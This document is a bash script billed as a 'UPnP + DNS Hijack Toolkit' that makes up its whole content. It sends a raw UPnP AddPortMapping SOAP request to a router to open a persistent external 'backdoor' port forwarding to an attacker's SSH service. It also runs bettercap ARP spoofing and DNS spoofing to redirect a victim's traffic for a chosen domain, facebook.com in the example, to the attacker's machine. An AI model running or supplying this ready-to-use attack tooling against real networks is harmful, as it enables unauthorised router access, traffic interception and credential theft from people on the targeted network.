#!/bin/bash
# ============================================
# UPnP + DNS Hijack Toolkit
# ============================================
# EDIT THESE 4 VARIABLES BEFORE RUNNING
ROUTER="192.168.1.1"          # Your router IP
ATTACKER="192.168.1.100"      # Your Kali IP
VICTIM="192.168.1.101"        # Target IP
SPOOF_DOMAIN="facebook.com"   # Domain to hijack
# ============================================

CONTROL_URL="/control/WANIPConnection"
PORT="5431"

case "$1" in
    backdoor)
        echo "[+] Opening backdoor: External 4444 -> $ATTACKER:22"
        curl -s -X POST http://$ROUTER:$PORT$CONTROL_URL \
        -H "SOAPACTION: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping" \
        -H "Content-Type: text/xml" \
        -d "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>4444</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>22</NewInternalPort><NewInternalClient>$ATTACKER</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>Hack</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>"
        echo "[+] Done. Verify with: ./hack.sh list"
        ;;
    list)
        upnpc -u http://$ROUTER:$PORT/igdevicedesc.xml -l
        ;;
    delete)
        echo "[+] Deleting port 4444"
        curl -s -X POST http://$ROUTER:$PORT$CONTROL_URL \
        -H "SOAPACTION: urn:schemas-upnp-org:service:WANIPConnection:1#DeletePortMapping" \
        -H "Content-Type: text/xml" \
        -d "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body><u:DeletePortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>4444</NewExternalPort><NewProtocol>TCP</NewProtocol></u:DeletePortMapping></s:Body></s:Envelope>"
        echo "[+] Done."
        ;;
    hijack)
        echo "[+] Starting DNS hijack for $SPOOF_DOMAIN -> $ATTACKER"
        echo "[+] Victim: $VICTIM"
        sudo bettercap -eval "set arp.spoof.targets $VICTIM; arp.spoof on; set dns.spoof.address $ATTACKER; set dns.spoof.domains *.$SPOOF_DOMAIN,$SPOOF_DOMAIN; dns.spoof on; net.probe on"
        ;;
    *)
        echo "Usage: ./hack.sh [backdoor|list|delete|hijack]"
        echo "  backdoor  - Open persistent TCP port 4444 to your Kali"
        echo "  list      - Show active UPnP rules"
        echo "  delete    - Remove the backdoor"
        echo "  hijack    - Start DNS spoofing (requires sudo, keep running)"
        ;;
esac
